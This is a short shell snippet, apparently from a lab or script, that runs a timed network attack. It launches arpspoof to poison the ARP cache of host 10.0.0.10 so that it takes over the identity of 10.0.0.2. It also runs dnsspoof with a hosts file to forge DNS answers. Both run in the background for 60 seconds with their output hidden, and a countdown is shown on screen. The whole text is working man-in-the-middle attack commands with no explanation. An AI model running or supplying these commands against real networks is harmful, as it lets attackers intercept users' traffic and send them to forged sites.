timeout 60 arpspoof -t 10.0.0.10 10.0.0.2 &> /dev/null&
timeout 60 dnsspoof -f hosts &> /dev/null&
countdown=60 now=$(date +%s) watch -tpn1 echo '$((now-$(date +%s)+countdown))'

